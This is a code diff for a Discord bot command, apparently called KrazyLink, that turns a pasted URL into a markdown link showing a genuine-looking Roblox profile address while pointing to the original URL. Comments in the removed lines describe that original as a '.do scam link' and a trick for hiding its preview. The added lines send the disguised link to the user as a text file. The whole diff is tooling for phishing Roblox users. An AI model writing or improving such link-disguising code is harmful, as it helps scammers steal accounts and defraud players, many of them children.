@@ -83,23 +83,20 @@ class KrazyLinkModal(discord.ui.Modal, title="Paste Your Roblox Link"):
         match = re.search(r"/users/(\d+)/profile", original_url)
         user_id = match.group(1) if match else "unknown"
 
-        # Visible = clean Roblox
-        visible_link = f"https://www.roblox.com/users/{user_id}/profile"
+        # Build disguised link EXACTLY like your screenshot
+        disguised = f"[https://www.roblox.com/users/{user_id}/profile]({original_url})"
 
-        # Hidden = original .do scam link
-        hidden_link = original_url
+        # Create file
+        from discord import File
+        import io
 
-        # IMPORTANT: space at the end hides the .do preview
-        disguised = f"[https:/www.roblox.com/users/{user_id}/profile]({original_url})"
+        file_content = disguised
+        file = File(io.BytesIO(file_content.encode()), filename="krazy_link.txt")
 
         try:
-            await interaction.user.send(
-                "**KRAZY LINK GENERATED**\n"
-                "Copy URL below:\n\n"
-                f"{disguised}"
-            )
+            await interaction.user.send(file=file)
             await interaction.response.send_message(
-                "Your KrazyLink has been sent to your DMs.",
+                "Your KrazyLink file has been sent to your DMs.",
                 ephemeral=True
             )
         except discord.Forbidden:
